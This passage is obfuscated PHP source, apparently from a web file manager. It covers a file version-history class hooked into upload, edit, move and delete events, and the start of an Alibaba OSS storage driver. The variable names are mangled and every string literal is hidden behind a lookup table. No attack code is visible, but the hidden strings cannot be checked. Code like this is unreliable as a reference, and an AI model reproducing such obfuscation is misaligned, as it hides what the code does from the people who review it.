json_encode($ªæ©‚Ã°[$¦àÜØÈë[1209]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $û¬È±« =& $_SERVER[å¸¿•¶£]; $Ñ¶É™Ôï = $GLOBALS[$û¬È±«[6]][$û¬È±«[89]]; if ($Ñ¶É™Ôï[$û¬È±«[1223]] != 1) { return; } if ($Ñ¶É™Ôï[$û¬È±«[1224]] <= 0) { return; } if (isset($_REQUEST[$û¬È±«[1225]]) && $_REQUEST[$û¬È±«[1225]] == $û¬È±«[88]) { return; } Hook::bind($û¬È±«[1226], $û¬È±«[1227]); Hook::bind($û¬È±«[1228], $û¬È±«[1229]); Hook::bind($û¬È±«[1230], $û¬È±«[1231]); Hook::bind($û¬È±«[1232], $û¬È±«[1233]); Hook::bind($û¬È±«[1234], $û¬È±«[1235]); Hook::bind($û¬È±«[1236], $û¬È±«[1237]); } public static function eventBeforeUpload($ğé³Ù¢÷) { if ($ğé³Ù¢÷[3] && $ğé³Ù¢÷[3] != REPEAT_REPLACE) { return; } $¯©ôğ±Á = self::parsePath($ğé³Ù¢÷[0]); if (!$¯©ôğ±Á) { return; } self::add($¯©ôğ±Á); } public static function eventBeforeEdit($ÚÔûÍç×) { $·–™Ï× = self::parsePath($ÚÔûÍç×[0]); if (!$·–™Ï×) { return; } self::add($·–™Ï×); } public static function eventBeforeCopyFile($Ëüòóıñ, $ò¨”Áø, $‹ĞÊÒ, $åÖ£°«ê, $·‘ºªî÷, $ô…Ù™úè) { $£á–û¡ =& $_SERVER[å¸¿•¶£]; if (isset($‹ĞÊÒ->_data[$£á–û¡[1162]]) && $‹ĞÊÒ->_data[$£á–û¡[1162]]) { return; } $¿½±ûÇ» = $‹ĞÊÒ->getPathOuter($åÖ£°«ê); $¶²–Ş†ñ = self::parsePath($¿½±ûÇ»); if (!$¶²–Ş†ñ) { return; } self::add($¶²–Ş†ñ); } public static function eventBeforeRename($©ÀŞéÅ) { $úè’î³Ÿ =& $_SERVER[å¸¿•¶£]; $ôğíÄ²¦ = self::parsePath($©ÀŞéÅ[0]); if (!$ôğíÄ²¦) { return; } $ñ†÷¤Ó = self::checkInHistory($ôğíÄ²¦); if (!$ñ†÷¤Ó) { return; } if ($ñ†÷¤Ó[$úè’î³Ÿ[33]] == $úè’î³Ÿ[200]) { $ÊİÛø£õ = self::listData($ôğíÄ²¦); if ($ÊİÛø£õ && $ÊİÛø£õ[$úè’î³Ÿ[369]]) { self::moveHistory($ôğíÄ²¦, $©ÀŞéÅ[1]); } } else { IO::rename($ñ†÷¤Ó[$úè’î³Ÿ[84]], $©ÀŞéÅ[1]); } } public static function eventBeforeMove($…õŸìÄÇ) { $´éé…¯ =& $_SERVER[å¸¿•¶£]; $ó«ŸÚ¾ = self::parsePath($…õŸìÄÇ[0]); if (!$ó«ŸÚ¾) { return; } $Àƒûãõ = self::parsePath($…õŸìÄÇ[1]); if (!$Àƒûãõ) { return; } $áÏ†³Š = $…õŸìÄÇ[3]; $½ÈêéíŒ = self::checkInHistory($ó«ŸÚ¾); if (!$½ÈêéíŒ) { return; } $”™ö›½ = self::pathHistory($Àƒûãõ); if ($½ÈêéíŒ[$´éé…¯[33]] == $´éé…¯[200]) { $÷àÒ„¦Å = self::listData($ó«ŸÚ¾); $àßÀ•ÎÅ = rtrim($Àƒûãõ, $´éé…¯[8]) . $´éé…¯[8] . ($áÏ†³Š ? $áÏ†³Š : get_path_this($ó«ŸÚ¾)); $Ã«ŠŞº³ = self::listData($àßÀ•ÎÅ); if ($÷àÒ„¦Å && $÷àÒ„¦Å[$´éé…¯[369]] && $Ã«ŠŞº³ && $Ã«ŠŞº³[$´éé…¯[369]]) { return self::clear($ó«ŸÚ¾); } if ($÷àÒ„¦Å && $÷àÒ„¦Å[$´éé…¯[369]]) { self::moveHistory($ó«ŸÚ¾, $áÏ†³Š, $”™ö›½); } } else { IO::move($½ÈêéíŒ[$´éé…¯[84]], $”™ö›½, !1, $áÏ†³Š); self::clearEmptyFolder(IO::pathFather($½ÈêéíŒ[$´éé…¯[84]])); } } public static function eventAfterRemove($úË«Îœ», $õ®…Çå‡) { $×Òå¢ËÇ =& $_SERVER[å¸¿•¶£]; if (!$õ®…Çå‡) { return; } $ÖÇò—åÔ = self::parsePath($úË«Îœ»[0]); if (!$ÖÇò—åÔ) { return; } $’Öüõ½Ê = self::checkInHistory($ÖÇò—åÔ); if (!$’Öüõ½Ê) { return; } if ($’Öüõ½Ê[$×Òå¢ËÇ[33]] == $×Òå¢ËÇ[200]) { $÷Ù‘’€Ø = self::listData($ÖÇò—åÔ, !1); if ($÷Ù‘’€Ø && $÷Ù‘’€Ø[$×Òå¢ËÇ[369]]) { self::clear($ÖÇò—åÔ, !1); } } else { IO::remove($’Öüõ½Ê[$×Òå¢ËÇ[84]]); self::clearEmptyFolder(IO::pathFather($’Öüõ½Ê[$×Òå¢ËÇ[84]])); } } private static function checkInHistory($ßÊ—ŒŒ‚) { $¶ûùú«Â = self::pathHistory($ßÊ—ŒŒ‚); if (!IO::exist($¶ûùú«Â)) { $¶ûùú«Â .= $_SERVER[å¸¿•¶£][1238]; } return IO::exist($¶ûùú«Â) ? IO::info($¶ûùú«Â) : !1; } private static function parsePath($„¹ŠĞİ«) { $¦øŒÃèÈ =& $_SERVER[å¸¿•¶£]; if (!$„¹ŠĞİ«) { return !1; } if ($GLOBALS[$¦øŒÃèÈ[1239]]) { return; } $‡¾ÆÂ¾ = KodIO::parse($„¹ŠĞİ«); $¼•’˜¥ = $‡¾ÆÂ¾[$¦øŒÃèÈ[33]]; $û‘¬ªÄù = !$¼•’˜¥ || $¼•’˜¥ == KodIO::KOD_IO || $¼•’˜¥ == KodIO::KOD_SHARE_ITEM; if (!$û‘¬ªÄù || !$‡¾ÆÂ¾[$¦øŒÃèÈ[1240]]) { return !1; } if (substr($„¹ŠĞİ«, 0, strlen(DATA_PATH . $¦øŒÃèÈ[1241])) == DATA_PATH . $¦øŒÃèÈ[1241]) { return !1; } if ($¼•’˜¥ == KodIO::KOD_SHARE_ITEM) { $€ëñÜ = IO::init($„¹ŠĞİ«); if ($€ëñÜ->pathParse[$¦øŒÃèÈ[1158]]) { return self::parsePath($€ëñÜ->pathParse[$¦øŒÃèÈ[1158]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ş—³Ÿ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¦øŒÃèÈ[1242]); foreach ($Ş—³Ÿ as $ƒ¡ĞÙŞ) { if (!$¼•’˜¥ && substr($„¹ŠĞİ«, 0, strlen($ƒ¡ĞÙŞ)) == $ƒ¡ĞÙŞ) { return !1; } } self::log($GLOBALS[$¦øŒÃèÈ[1153]] . $¦øŒÃèÈ[1243] . $„¹ŠĞİ«); return $„¹ŠĞİ«; } private static function pathHistory($Ï¦ëåŞç) { $®¢£ÏÒè =& $_SERVER[å¸¿•¶£]; $ÓĞ¿Áªì = self::$_historyBase . ltrim(KodIO::clear($Ï¦ëåŞç), $®¢£ÏÒè[8]); $ÓĞ¿Áªì = str_replace(array($®¢£ÏÒè[1244]), array($®¢£ÏÒè[1245]), $ÓĞ¿Áªì); return $ÓĞ¿Áªì; } public static function log($»˜Ì ) { } public static function historyCount($Øú«„ûü) { $¹–Ô€ö€ =& $_SERVER[å¸¿•¶£]; $ŠË¯Ê¹© = array(); $÷ú˜Şıı = array(); foreach ($Øú«„ûü as $·ñïåõ) { $¾«òàÜÊ = get_path_father($·ñïåõ); if (!$÷ú˜Şıı[$¾«òàÜÊ]) { $÷ú˜Şıı[$¾«òàÜÊ] = array(); } $÷ú˜Şıı[$¾«òàÜÊ][] = get_path_this($·ñïåõ); } foreach ($÷ú˜Şıı as $¾«òàÜÊ => $äö„ìé) { $ƒ¸øö›´ = self::parsePath($¾«òàÜÊ); if (!$ƒ¸øö›´) { continue; } foreach ($äö„ìé as $û÷´–ÊÄ) { $âÁìîşÎ = self::listData(rtrim($ƒ¸øö›´, $¹–Ô€ö€[8]) . $¹–Ô€ö€[8] . $û÷´–ÊÄ, !1); if ($âÁìîşÎ && $âÁìîşÎ[$¹–Ô€ö€[369]]) { $ŠË¯Ê¹©[rtrim($¾«òàÜÊ, $¹–Ô€ö€[8]) . $¹–Ô€ö€[8] . $û÷´–ÊÄ] = count($âÁìîşÎ[$¹–Ô€ö€[369]]); } } } return $ŠË¯Ê¹©; } public static function add($Ìœ‹‡Ÿ§) { $¤¹¡ìĞş =& $_SERVER[å¸¿•¶£]; $ø­ô”© = self::listData($Ìœ‹‡Ÿ§); if (!$ø­ô”©) { return; } $™Œë«ëû = Model($¤¹¡ìĞş[777])->get($¤¹¡ìĞş[1246]); $ÊÖ¥¸”„ = $GLOBALS[$¤¹¡ìĞş[6]][$¤¹¡ìĞş[89]][$¤¹¡ìĞş[1224]]; $Ôï½›§ = $™Œë«ëû == $¤¹¡ìĞş[1247] ? min(5, $ÊÖ¥¸”„) : $ÊÖ¥¸”„; if ($ÊÖ¥¸”„ <= 0) { return; } $‹»¿Ÿ¨ = IO::info($Ìœ‹‡Ÿ§); $áÀåÃæ = $ø­ô”©[$¤¹¡ìĞş[369]]; if ($‹»¿Ÿ¨[$¤¹¡ìĞş[76]] == 0) { return; } if ($‹»¿Ÿ¨[$¤¹¡ìĞş[76]] >= 1024 * 1024 * 500) { return !1; } $ÔËÌÓá = IO::hashSimple($Ìœ‹‡Ÿ§); if ($áÀåÃæ && $áÀåÃæ[0][$¤¹¡ìĞş[177]] == $ÔËÌÓá) { return !0; } if (array_key_exists($¤¹¡ìĞş[203], $‹»¿Ÿ¨) && !$‹»¿Ÿ¨[$¤¹¡ìĞş[203]]) { return !1; } $’æ‘¡˜å = short_id(time()); $ƒü¡âİœ = array($¤¹¡ìĞş[399] => $’æ‘¡˜å, $¤¹¡ìĞş[177] => $ÔËÌÓá, $¤¹¡ìĞş[32] => $‹»¿Ÿ¨[$¤¹¡ìĞş[32]] . $¤¹¡ìĞş[10] . date($¤¹¡ìĞş[1248]) . rand_string(1), $¤¹¡ìĞş[76] => $‹»¿Ÿ¨[$¤¹¡ìĞş[76]], $¤¹¡ìĞş[454] => USER_ID, $¤¹¡ìĞş[201] => time(), $¤¹¡ìĞş[1249] => $¤¹¡ìĞş[12]); IO::mkdir($ø­ô”©[$¤¹¡ìĞş[1250]]); $ÄÃ¢«˜Ã = IO::copy($Ìœ‹‡Ÿ§, $ø­ô”©[$¤¹¡ìĞş[1250]], !1, $ƒü¡âİœ[$¤¹¡ìĞş[32]]); if (!$ÄÃ¢«˜Ã) { self::clearEmptyFolder($ø­ô”©[$¤¹¡ìĞş[1250]]); return !1; } array_unshift($áÀåÃæ, $ƒü¡âİœ); if (count($áÀåÃæ) > $Ôï½›§) { $ìö°ï’ = array_slice($áÀåÃæ, $Ôï½›§); foreach ($ìö°ï’ as $¯ÅØĞ¥œ) { IO::remove($ø­ô”©[$¤¹¡ìĞş[1250]] . $¯ÅØĞ¥œ[$¤¹¡ìĞş[32]]); } $áÀåÃæ = array_slice($áÀåÃæ, 0, $Ôï½›§); } return self::saveData($ø­ô”©[$¤¹¡ìĞş[1251]], $áÀåÃæ); } public static function remove($‡¼Ñü¡º, $àëîÉÅ›) { $ğ’¼¢¬ =& $_SERVER[å¸¿•¶£]; $·ÍäğÀû = self::listData($‡¼Ñü¡º); $ÜÎµ‘ê = array(); if (!$·ÍäğÀû) { return !1; } foreach ($·ÍäğÀû[$ğ’¼¢¬[369]] as $·Áƒ¢ë) { if ($·Áƒ¢ë[$ğ’¼¢¬[399]] == $àëîÉÅ›) { IO::remove($·ÍäğÀû[$ğ’¼¢¬[1250]] . $·Áƒ¢ë[$ğ’¼¢¬[32]]); continue; } $ÜÎµ‘ê[] = $·Áƒ¢ë; } return self::saveData($·ÍäğÀû[$ğ’¼¢¬[1251]], $ÜÎµ‘ê); } public static function clear($ƒ¥‘¾Ó™, $Ê°Ã˜èÒ = true) { $´›«‹£¥ =& $_SERVER[å¸¿•¶£]; $ãÆÇÈ = self::listData($ƒ¥‘¾Ó™, $Ê°Ã˜èÒ); if (!$ãÆÇÈ) { return !1; } foreach ($ãÆÇÈ[$´›«‹£¥[369]] as $Áœ¶ò€¦) { IO::remove($ãÆÇÈ[$´›«‹£¥[1250]] . $Áœ¶ò€¦[$´›«‹£¥[32]]); } return self::saveData($ãÆÇÈ[$´›«‹£¥[1251]], array()); } public static function moveHistory($İÄ—ĞÀ¸, $£öİÊ›™ = '', $–³ÍªÅ„ = '') { $––«†‚¨ =& $_SERVER[å¸¿•¶£]; $Î§´Üæš = self::listData($İÄ—ĞÀ¸, !1); if (!$Î§´Üæš || !$Î§´Üæš[$––«†‚¨[369]]) { return !1; } $Ù²‹€Û = $––«†‚¨[1238]; $£öİÊ›™ = $£öİÊ›™ ? $£öİÊ›™ : get_path_this($İÄ—ĞÀ¸); $–³ÍªÅ„ = $–³ÍªÅ„ ? $–³ÍªÅ„ : $Î§´Üæš[$––«†‚¨[1250]]; $£øÑñ£á = substr(get_path_this($Î§´Üæš[$––«†‚¨[1251]]), 0, -strlen($Ù²‹€Û)); foreach ($Î§´Üæš[$––«†‚¨[369]] as $İùÏâ => $à‘´¹ ) { $Öş§÷…Ã = $£öİÊ›™ . substr($à‘´¹ [$––«†‚¨[32]], strlen($£øÑñ£á)); $Ì‹¢óÎ = IO::move($Î§´Üæš[$––«†‚¨[1250]] . $à‘´¹ [$––«†‚¨[32]], $–³ÍªÅ„, !1, $Öş§÷…Ã); if ($Ì‹¢óÎ) { $Î§´Üæš[$––«†‚¨[369]][$İùÏâ][$––«†‚¨[32]] = $Öş§÷…Ã; } } $Î§´Üæš[$––«†‚¨[1251]] = IO::move($Î§´Üæš[$––«†‚¨[1251]], $–³ÍªÅ„, !1, $£öİÊ›™ . $Ù²‹€Û); self::saveData($Î§´Üæš[$––«†‚¨[1251]], $Î§´Üæš[$––«†‚¨[369]]); self::clearEmptyFolder($Î§´Üæš[$––«†‚¨[1250]]); } public static function rollback($ìí¶‰, $Ú¶“–¦Ó) { $–‚®Û‡ç =& $_SERVER[å¸¿•¶£]; $ÕÏåø = self::listData($ìí¶‰); if (!$ÕÏåø) { return; } $’Æğ¼Û = IO::info($ìí¶‰); foreach ($ÕÏåø[$–‚®Û‡ç[369]] as $°Ä—Ë…Ö => $»’†½Œ¨) { if ($»’†½Œ¨[$–‚®Û‡ç[399]] == $Ú¶“–¦Ó) { self::add($ìí¶‰); $¢óŸ‘Î = $ÕÏåø[$–‚®Û‡ç[1250]] . $»’†½Œ¨[$–‚®Û‡ç[32]]; $İË”ˆñÍ = IO::copy($¢óŸ‘Î, IO::pathFather($ìí¶‰), REPEAT_REPLACE, $’Æğ¼Û[$–‚®Û‡ç[32]]); if ($İË”ˆñÍ) { self::remove($ìí¶‰, $Ú¶“–¦Ó); } return $İË”ˆñÍ; } } return !1; } public static function setDetail($°¸ÆæÖÅ, $ÕÄÏå ¬, $©õ¬ğöÔ) { $ÕìáËğ¡ =& $_SERVER[å¸¿•¶£]; $éÎïÄÍµ = self::listData($°¸ÆæÖÅ); if (!$éÎïÄÍµ) { return; } foreach ($éÎïÄÍµ[$ÕìáËğ¡[369]] as $å‚õñ¹Ğ => $à†ôï®) { if ($à†ôï®[$ÕìáËğ¡[399]] == $ÕÄÏå ¬) { $éÎïÄÍµ[$ÕìáËğ¡[369]][$å‚õñ¹Ğ][$ÕìáËğ¡[1249]] = $©õ¬ğöÔ; self::saveData($éÎïÄÍµ[$ÕìáËğ¡[1251]], $éÎïÄÍµ[$ÕìáËğ¡[369]]); return !0; } } return !1; } public static function fileInfo($°íÄí», $¿ÙêîÍ) { $ÜñÉ÷´ =& $_SERVER[å¸¿•¶£]; $‡õ‡¨‹ª = self::listData($°íÄí»); if (!$‡õ‡¨‹ª) { show_json(LNG($ÜñÉ÷´[105]), !1); } $Ñ…¨Á = $ÜñÉ÷´[12]; foreach ($‡õ‡¨‹ª[$ÜñÉ÷´[369]] as $®±ÆÍ¦é => $ˆ¾ÂéÎí) { if ($ˆ¾ÂéÎí[$ÜñÉ÷´[399]] != $¿ÙêîÍ) { continue; } $Ñ…¨Á = $‡õ‡¨‹ª[$ÜñÉ÷´[1250]] . $ˆ¾ÂéÎí[$ÜñÉ÷´[32]]; break; } if (!$Ñ…¨Á) { show_json(LNG($ÜñÉ÷´[105]), !1); } return IO::info($Ñ…¨Á); } public static function fileOut($Ë×ºàá¼, $›–ÅîãŒ, $ãƒøŸüä = false) { $¶´¢ŞÊ© =& $_SERVER[å¸¿•¶£]; $»õ¦öıº = self::fileInfo($Ë×ºàá¼, $›–ÅîãŒ); $ó˜¸†®è =& $GLOBALS[$¶´¢ŞÊ©[7]]; $ãƒøŸüä = isset($ó˜¸†®è[$¶´¢ŞÊ©[1201]]) && $ó˜¸†®è[$¶´¢ŞÊ©[1201]] == 1; if (isset($ó˜¸†®è[$¶´¢ŞÊ©[33]]) && $ó˜¸†®è[$¶´¢ŞÊ©[33]] == $¶´¢ŞÊ©[1252]) { return IO::fileOutImage($»õ¦öıº[$¶´¢ŞÊ©[84]], $ó˜¸†®è[$¶´¢ŞÊ©[1253]]); } IO::fileOut($»õ¦öıº[$¶´¢ŞÊ©[84]], $ãƒøŸüä, get_path_this($Ë×ºàá¼)); } public static function listData($íİ¹îû, $—œ‡ıÅò = true) { $èĞù‰³ =& $_SERVER[å¸¿•¶£]; if ($—œ‡ıÅò && !IO::exist($íİ¹îû)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($íİ¹îû, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ØÖ–ıã = self::pathHistory($íİ¹îû); $êÜ¾è„ = array($èĞù‰³[1251] => $ØÖ–ıã . $èĞù‰³[1238], $èĞù‰³[1250] => rtrim(get_path_father($ØÖ–ıã), $èĞù‰³[8]) . $èĞù‰³[8], $èĞù‰³[369] => array()); $İşë¨Ó• = IO::getContent($êÜ¾è„[$èĞù‰³[1251]]); if ($İşë¨Ó•) { $«Œµ©’Ğ = json_decode($İşë¨Ó•, !0); if (is_array($«Œµ©’Ğ)) { $êÜ¾è„[$èĞù‰³[369]] = $«Œµ©’Ğ; } } return $êÜ¾è„; } private static function saveData($È±Ê£ˆ¤, $ÒÙÚùê«) { $»öÖ¥†¡ =& $_SERVER[å¸¿•¶£]; self::log($»öÖ¥†¡[1254] . $È±Ê£ˆ¤ . $»öÖ¥†¡[71] . count($ÒÙÚùê«), $»öÖ¥†¡[758]); if ($ÒÙÚùê«) { return IO::setContent($È±Ê£ˆ¤, json_encode($ÒÙÚùê«)); } $ˆİñáŞ = IO::pathFather($È±Ê£ˆ¤); IO::remove($È±Ê£ˆ¤); self::clearEmptyFolder($ˆİñáŞ); return !0; } public static function clearEmptyFolder($šœŸµÆí) { $ŸĞÛ¢˜¡ =& $_SERVER[å¸¿•¶£]; if (trim($šœŸµÆí, $ŸĞÛ¢˜¡[8]) == trim(self::$_historyBase, $ŸĞÛ¢˜¡[8])) { return; } $üŸÅ´ = IO::pathFather($šœŸµÆí); $íüû·åÜ = IO::has($šœŸµÆí, !0); if ($íüû·åÜ[$ŸĞÛ¢˜¡[207]] > 0 || $íüû·åÜ[$ŸĞÛ¢˜¡[208]] > 0) { return; } IO::remove($šœŸµÆí); self::clearEmptyFolder($üŸÅ´); } private static function getBasePath() { $Èïíö™ =& $_SERVER[å¸¿•¶£]; $…ø÷¼İ¼ = Model($Èïíö™[1255])->get($Èïíö™[1256]); if ($…ø÷¼İ¼) { if (!IO::exist($…ø÷¼İ¼)) { IO::mkdir($…ø÷¼İ¼); } if (get_path_this($…ø÷¼İ¼) == $Èïíö™[1241]) { $ ­¯ÛË× = $Èïíö™[1257] . rand_string(8); @rename($…ø÷¼İ¼, get_path_father($…ø÷¼İ¼) . $Èïíö™[8] . $ ­¯ÛË×); $…ø÷¼İ¼ = DATA_PATH . $ ­¯ÛË× . $Èïíö™[8]; file_put_contents(DATA_PATH . $Èïíö™[1191], $Èïíö™[12]); Model($Èïíö™[1255])->set($Èïíö™[1256], $…ø÷¼İ¼); } return $…ø÷¼İ¼; } $…ø÷¼İ¼ = DATA_PATH . $Èïíö™[1257] . rand_string(8) . $Èïíö™[8]; $…ø÷¼İ¼ = IO::mkdir($…ø÷¼İ¼); $…ø÷¼İ¼ = rtrim($…ø÷¼İ¼, $Èïíö™[8]) . $Èïíö™[8]; file_put_contents($…ø÷¼İ¼ . $Èïíö™[1191], $Èïíö™[12]); file_put_contents(DATA_PATH . $Èïíö™[1191], $Èïíö™[12]); Model($Èïíö™[1255])->set($Èïíö™[1256], $…ø÷¼İ¼); return $…ø÷¼İ¼; } } goto D²µ„ğÄƒ; eâ¡ñ“ğÓ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¤„µ¦äÜ) { parent::__construct(); include_once SDK_DIR . $_SERVER[å¸¿•¶£][1401]; $this->_init($¤„µ¦äÜ); } public function _init($ª—õ°ñè) { $½¿¨ú¼ˆ =& $_SERVER[å¸¿•¶£]; $this->config = $ª—õ°ñè; foreach ($ª—õ°ñè as $ ”ÎŠÅ => $ıó©ê¾) { if (isset($this->{$ ”ÎŠÅ})) { $this->{$ ”ÎŠÅ} = $ıó©ê¾; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($½¿¨ú¼ˆ[1402] . LNG($½¿¨ú¼ˆ[1403])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $˜òÙó‹Ì =& $_SERVER[å¸¿•¶£]; $Æ£ß™±Ë = new OSS\Model\CorsConfig(); $èÖ“õü = new OSS\Model\CorsRule(); $èÖ“õü->addAllowedOrigin($˜òÙó‹Ì[1404]); $èÖ“õü->addAllowedMethod($˜òÙó‹Ì[1405]); $èÖ“õü->addAllowedMethod($˜òÙó‹Ì[1406]); $èÖ“õü->addAllowedMethod($˜òÙó‹Ì[1407]); $èÖ“õü->addAllowedMethod($˜òÙó‹Ì[1408]); $èÖ“õü->addAllowedMethod($˜òÙó‹Ì[160]); $èÖ“õü->setMaxAgeSeconds(600); $èÖ“õü->addExposeHeader($˜òÙó‹Ì[1409]); $èÖ“õü->addAllowedHeader($˜òÙó‹Ì[1404]); $Æ£ß™±Ë->addRule($èÖ“õü); try { $this->client->putBucketCors($this->bucket, $Æ£ß™±Ë); } catch (OSS\Core\OssException $öÏ¤²±¦) { return !1; } return !0; } public function getBucketCors() { $Ä»®ƒá =& $_SERVER[å¸¿•¶£]; $ïÅ‘áŒ = null; try { $ïÅ‘áŒ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $“–¾ì›) { return null; } if (!$ïÅ‘áŒ || !($€ìÃ·âÆ = $ïÅ‘áŒ->getRules())) { return null; } $˜İÆ›À½ = $€ìÃ·âÆ[0]->getAllowedOrigins(); $œöÃ†Òã = $€ìÃ·âÆ[0]->getAllowedMethods(); $İÁ™åÚº = $€ìÃ·âÆ[0]->getMaxAgeSeconds(); $¢ÈçÑÚ™ = $€ìÃ·âÆ[0]->getExposeHeaders(); $îÀ—§¶­ = $€ìÃ·âÆ[0]->getAllowedHeaders(); return array($Ä»®ƒá[188] => isset($˜İÆ›À½[0]) ? $˜İÆ›À½[0] : $Ä»®ƒá[12], $Ä»®ƒá[192] => $œöÃ†Òã, $Ä»®ƒá[1410] => $İÁ™åÚº, $Ä»®ƒá[1411] => isset($¢ÈçÑÚ™[0]) ? $¢ÈçÑÚ™[0] : $Ä»®ƒá[12], $Ä»®ƒá[190] => isset($îÀ—§¶­[0]) ? $îÀ—§¶­[0] : $Ä»®ƒá[12]); } public function isBucketCors() { $õüøÒü =& $_SERVER[å¸¿•¶£]; $…êƒíÜÈ = $this->getBucketCors(); if (!$…êƒíÜÈ || !is_array($…êƒíÜÈ)) { return !1; } if ($…êƒíÜÈ[$õüøÒü[188]] != $õüøÒü[189] || $…êƒíÜÈ[$õüøÒü[190]] != $õüøÒü[189]) { return !1; } $èÅ†™¢Ñ = array_map($õüøÒü[191], $…êƒíÜÈ[$õüøÒü[192]]); if (!is_array($èÅ†™¢Ñ)) { $èÅ†™¢Ñ = array(); } $££ÔŠÊ = array($õüøÒü[193], $õüøÒü[194], $õüøÒü[195], $õüøÒü[196], $õüøÒü[197]); $ƒ±¹¾ó³ = array_diff($££ÔŠÊ, $èÅ†™¢Ñ); return empty($ƒ±¹¾ó³); } public function mkfile($ß‡ÌÓ¨â, $’“ı°Û™ = '', $„Ú¼¾…÷ = REPEAT_RENAME) { $Û¢Â²»§ = $this->setContent($ß‡ÌÓ¨â, $’“ı°Û™); if ($Û¢Â²»§ !== !1) { return $this->getPathOuter($ß‡ÌÓ¨â); } return !1; } public function mkdir($¬Ğ­Ìï, $ÚÖ…˜® = REPEAT_SKIP) { if ($ÚÖ…˜® && $this->_isFolder($¬Ğ­Ìï)) { return $this->getPathOuter($¬Ğ­Ìï); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¬Ğ­Ìï)); } catch (OSS\Core\OssException $ñş£İÊ—) { return !1; } return $this->getPathOuter($¬Ğ­Ìï); } private function fileList($’«ğÃà, $ÂÊş±§ª = '', $˜Å¯Ó = 0) { $ß¨ÍñäÊ =& $_SERVER[å¸¿•¶£]; $’«ğÃà = trim($’«ğÃà, $ß¨ÍñäÊ[8]); $°ñ†åÑ« = empty($’«ğÃà) && $’«ğÃà !== $ß¨ÍñäÊ[198] ? $ß¨ÍñäÊ[12] : $’«ğÃà . $ß¨ÍñäÊ[8]; $¬ÇŞÛä» = $ß¨ÍñäÊ[12]; $†Àüª€ = 1000; $Ûğ¡ïÁ = $ÏÚºÏí = array(); while (!0) { check_abort(); $Â¾¼õæ¹ = array($ß¨ÍñäÊ[1412] => $ÂÊş±§ª, $ß¨ÍñäÊ[1413] => $°ñ†åÑ«, $ß¨ÍñäÊ[1414] => $†Àüª€, $ß¨ÍñäÊ[1415] => $¬ÇŞÛä»); try { $‹µÎ…ûŒ = $this->client->listObjects($this->bucket, $Â¾¼õæ¹); } catch (OSS\Core\OssException $¢ë÷ÒàÈ) { break; } $¬ÇŞÛä» = $‹µÎ…ûŒ->getNextMarker(); $Ç²¨ú—ä = $‹µÎ…ûŒ->getObjectList(); $•¯„ÑÊÕ = $‹µÎ…ûŒ->getPrefixList(); foreach ($Ç²¨ú—ä as $·›‹ÔÓ) { if ($·›‹ÔÓ->getKey() == $°ñ†åÑ«) { continue; } $»õÏ = $·›‹ÔÓ->getKey(); $ƒÁÍ…ˆú = $·›‹ÔÓ->getSize(); $†ª¬¾Âë = $·›‹ÔÓ->getLastModified(); $†«•¿ = $˜Å¯Ó ? array($ß¨ÍñäÊ[32] => $»õÏ, $ß¨ÍñäÊ[76] => $ƒÁÍ…ˆú, $ß¨ÍñäÊ[180] => strtotime($†ª¬¾Âë)) : $»õÏ; $·Š³–°à = $ƒÁÍ…ˆú == 0 && substr($»õÏ, strlen($»õÏ) - 1, 1) == $ß¨ÍñäÊ[8] ? !0 : !1; $ì¥‡ÜÅ˜ = array($ß¨ÍñäÊ[76] => $ƒÁÍ…ˆú, $ß¨ÍñäÊ[1416] => $ƒÁÍ…ˆú, $ß¨ÍñäÊ[85] => strtotime($†ª¬¾Âë), $ß¨ÍñäÊ[1417] => $†ª¬¾Âë); $this->cacheMethodInfoSet($»õÏ, $·Š³–°à, $ì¥‡ÜÅ˜); if ($·Š³–°à) { $Ûğ¡ïÁ[] = $»õÏ; continue; } $ÏÚºÏí[] = $†«•¿; } foreach ($•¯„ÑÊÕ as $»šîÆæÙ) { $Ûğ¡ïÁ[] = $»šîÆæÙ->getPrefix(); $this->cacheMethodInfoSet($»šîÆæÙ->getPrefix(), !0); } if ($¬ÇŞÛä» === $ß¨ÍñäÊ[12]) { break; } } $this->cacheMethodInfoSet($’«ğÃà, !0); return array($ß¨ÍñäÊ[82] => $Ûğ¡ïÁ, $ß¨ÍñäÊ[83] => $ÏÚºÏí); } public function copyFile($‘›ôƒÈØ, $ÛáºŒÊ) { $Ğ›Ğó§… = $this->size($‘›ôƒÈØ); if ($Ğ›Ğó§… < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‘›ôƒÈØ, $this->bucket, $this->pathEncode($ÛáºŒÊ)); } catch (OSS\Core\OssException $°áİ¯—Ğ) { return !1; } return $this->getPathOuter($ÛáºŒÊ); } $ÇŸ¡²° = $this->multiCopyObject($‘›ôƒÈØ, $ÛáºŒÊ, $Ğ›Ğó§…); return $ÇŸ¡²° ? $this->getPathOuter($ÛáºŒÊ) : !1; } private function multiCopyObject($—Èéæ—ğ, $°ÀŒÆœ§, $¾·÷‹‡Ü) { $›åçˆÑé =& $_SERVER[å¸¿•¶£]; try { $ŞŞÜÜåœ = array(); if ($ å¥âö— = $this->hashMd5($—Èéæ—ğ)) { $ŞŞÜÜåœ = array(OSS\OssClient::OSS_HEADERS => array($›åçˆÑé[1418] => $ å¥âö—)); } $Ê¸‰Ë°Ë = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($°ÀŒÆœ§), $ŞŞÜÜåœ); $ûÆ»ú¾­ = 1; $‡®Ñ¹€İ = 0; $¬×éÇÈÄ = array(); $–À¬’Ï = 1024 * 1024 * 10; $˜†ù–•‡ = $this->client->generateMultiuploadParts($¾·÷‹‡Ü, $–À¬’Ï); foreach ($˜†ù–•‡ as $Ñ„¿ø¤– => $šÑÙÆøÑ) { 